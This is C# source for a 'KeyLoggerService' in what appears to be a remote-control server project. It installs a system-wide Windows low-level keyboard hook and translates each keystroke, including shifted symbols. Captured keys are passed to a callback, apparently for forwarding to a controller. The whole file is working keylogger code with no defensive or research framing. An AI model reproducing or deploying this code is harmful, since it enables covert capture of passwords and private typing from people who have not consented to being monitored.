using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace RemoteControlServer.Services
{
    /// <summary>
    /// KeyLoggerService manages a Windows low-level keyboard hook and forwards captured keys.
    /// StartHook will create a dedicated STA thread with a message loop to run the hook.
    /// </summary>
    public class KeyLoggerService
    {
        // --- P/Invoke constants and structs ---
        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public uint vkCode; public uint scanCode; public uint flags; public uint time; public IntPtr dwExtraInfo;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        public static extern short GetKeyState(int nVirtKey);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int LLKHF_INJECTED = 0x00000010;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // --- State ---
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static Action<string> _callback;

        /// <summary>True when the low-level keyboard hook has been set.</summary>
        public static bool IsRunning => _hookID != IntPtr.Zero;

        /// <summary>Start keylogger hook and forward data to callback.</summary>
        public static void StartHook(Action<string> callback)
        {
            if (_hookID != IntPtr.Zero) return;

            _callback = callback;

            // Run the hook on a separate STA thread with a message loop
            Thread hookThread = new Thread(() =>
            {
                _hookID = SetHook(_proc);
                Application.Run(); // Keep the message loop alive for the hook
            });

            hookThread.IsBackground = true;
            hookThread.SetApartmentState(ApartmentState.STA);
            hookThread.Start();
        }

        /// <summary>Unhook the low-level keyboard hook.</summary>
        public static void StopHook()
        {
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
        }

        // --- 5. LOGIC XỬ LÝ (GIỮ NGUYÊN) ---
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                KBDLLHOOKSTRUCT kbStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);

                // Bỏ qua phím ảo do phần mềm khác bắn ra
                if ((kbStruct.flags & LLKHF_INJECTED) != 0)
                {
                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
                }

                Keys key = (Keys)kbStruct.vkCode;
                
                // Lấy ký tự đã dịch (Shift, Capslock...)
                string rawKey = key.ToString();
                string translatedChar = GetCharsFromKeys(key);

                if (_callback != null)
                {
                    // Gửi format: RAW|||TRANSLATED
                    _callback($"{rawKey}|||{translatedChar}");
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string GetCharsFromKeys(Keys key)
        {
            // (Giữ nguyên logic dịch phím của bạn ở đây)
            bool shift = (GetKeyState(0x10) & 0x8000) != 0;
            bool capsLock = (GetKeyState(0x14) & 0x0001) != 0;

            if (key == Keys.Space) return " ";
            if (key == Keys.Enter) return "<ENTER>";
            if (key == Keys.Back) return "<BACK>";
            if (key == Keys.Tab) return "<TAB>";

            if (key.ToString().Contains("Shift") || key.ToString().Contains("Control") || 
                key.ToString().Contains("Alt") || key.ToString().Contains("Win") || 
                key.ToString().Contains("F") && key.ToString().Length > 1) 
                return "";

            if (key >= Keys.A && key <= Keys.Z)
            {
                bool isUpperCase = shift ^ capsLock;
                return isUpperCase ? key.ToString().ToUpper() : key.ToString().ToLower();
            }

            if (key >= Keys.D0 && key <= Keys.D9)
            {
                string number = key.ToString().Replace("D", "");
                if (!shift) return number;
                switch (number) {
                    case "1": return "!"; case "2": return "@"; case "3": return "#";
                    case "4": return "$"; case "5": return "%"; case "6": return "^";
                    case "7": return "&"; case "8": return "*"; case "9": return "("; case "0": return ")";
                }
            }

            if (key >= Keys.NumPad0 && key <= Keys.NumPad9)
                return key.ToString().Replace("NumPad", "");

            switch (key)
            {
                case Keys.OemPeriod: return shift ? ">" : ".";
                case Keys.Oemcomma: return shift ? "<" : ",";
                case Keys.OemQuestion: return shift ? "?" : "/";
                case Keys.OemMinus: return shift ? "_" : "-";
                case Keys.Oemplus: return shift ? "+" : "=";
                case Keys.Oem1: return shift ? ":" : ";";
                case Keys.Oem7: return shift ? "\"" : "'";
            }
            return "";
        }
    }
}